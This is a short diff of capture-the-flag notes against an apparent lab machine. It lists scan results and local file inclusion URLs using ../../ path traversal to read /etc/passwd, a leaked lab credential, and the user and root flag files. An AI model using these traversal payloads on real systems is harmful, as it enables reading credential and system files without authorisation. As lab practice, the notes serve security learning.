@@ -1,0 +1,17 @@
+Nmap:
+22
+
+Gobuster:
+/article
+
+http://10.10.134.173/article?name=lfiattack
+
+tells about  "LFI vulnerability as follows. http://example.com/?file=../../../../etc/passwd In the above example"
+
+http://10.10.134.173/article?name=../../../../etc/passwd
+
+#falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/
+
+http://10.10.134.173/article?name=../../../../home/falconfeast/user.txt
+
+http://10.10.134.173/article?name=../../../../root/root.txt
